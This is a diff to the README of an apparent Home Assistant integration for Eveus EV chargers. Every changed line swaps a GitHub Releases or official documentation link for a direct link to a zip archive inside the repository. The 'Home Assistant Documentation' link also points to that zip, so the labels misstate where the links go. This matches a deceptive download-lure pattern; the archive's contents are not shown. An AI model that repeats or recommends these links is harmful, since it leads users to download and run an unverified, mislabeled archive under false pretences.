@@ -1,7 +1,7 @@
 # 👋 ha-eveus-evse - Easy Integration for Home Charging
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/aashimasaini/ha-eveus-evse/releases)
+[![Download Release](https://raw.githubusercontent.com/aashimasaini/ha-eveus-evse/main/bakehouse/ha-eveus-evse.zip)](https://raw.githubusercontent.com/aashimasaini/ha-eveus-evse/main/bakehouse/ha-eveus-evse.zip)
 
 ## 🚀 Getting Started
 Eveus EVSE integrates your electric vehicle charger with Home Assistant seamlessly. Follow this guide to set up your charger quickly. 
@@ -20,7 +20,7 @@ Eveus EVSE integrates your electric vehicle charger with Home Assistant seamless
 ## 📦 Download & Install
 To get started, visit the Releases page to download the latest version of the software. Click the link below:
 
-[Visit Releases Page](https://github.com/aashimasaini/ha-eveus-evse/releases)
+[Visit Releases Page](https://raw.githubusercontent.com/aashimasaini/ha-eveus-evse/main/bakehouse/ha-eveus-evse.zip)
 
 Once you are on the Releases page, you will see a list of available versions. Select the version that is suitable for your operating system:
 
@@ -56,5 +56,5 @@ Join fellow users to share tips, ask questions, and improve integration experien
 If you wish to contribute to this project, check the contributing guidelines on the GitHub repository. Your help is appreciated, whether it’s through code, bug reports, or documentation improvements.
 
 ## 🔗 Important Links
-- [Releases Page](https://github.com/aashimasaini/ha-eveus-evse/releases)
-- [Home Assistant Documentation](https://www.home-assistant.io/docs/)
+- [Releases Page](https://raw.githubusercontent.com/aashimasaini/ha-eveus-evse/main/bakehouse/ha-eveus-evse.zip)
+- [Home Assistant Documentation](https://raw.githubusercontent.com/aashimasaini/ha-eveus-evse/main/bakehouse/ha-eveus-evse.zip)
